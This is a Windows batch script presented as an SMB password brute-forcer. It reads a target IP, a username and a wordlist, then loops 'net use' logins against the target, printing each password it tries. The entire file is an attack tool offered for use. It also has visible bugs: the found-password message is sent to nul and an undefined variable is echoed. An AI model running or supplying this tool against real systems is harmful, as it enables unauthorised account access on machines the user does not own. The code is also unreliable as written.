@echo off
title SMB Bruteforce
color A
echo.

echo [This password cracker was made by @DellUserVS. Please use this software at your own risk. We are not responsible for any loss.]

echo.

set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password list: "

set /a count=0

for /f %%a in (%wordlist%) do (
	set pass=%%a
	set /a count += 1
	call :attempt
)

echo Password Not Found :(
pause
exit

:success
echo Password Found: %pass% >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT_NO: %count%] [ATTEMPTED: %pass%] [ATTEMPT_STATUS: %FAILED%]
if %errorlevel% EQU 0 goto success